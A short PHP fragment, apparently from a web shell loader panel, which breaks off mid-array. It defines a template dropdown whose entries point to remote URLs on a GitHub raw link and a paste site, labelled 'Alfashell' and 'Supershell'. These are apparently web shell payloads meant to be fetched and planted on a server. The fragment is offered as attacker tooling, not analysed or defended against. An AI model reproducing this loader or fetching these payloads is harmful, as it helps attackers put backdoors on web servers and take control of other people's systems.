$msg = "";
$msg_class = "";

// --- PRESET TEMPLATES ---
$templates = [
    "" => "-- Select Module Template --",
    "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/ptsmc" => "Template 1: Alfashell",
    "https://okepaste.cc/r/79e072b0" => "Template 2: Supershell",
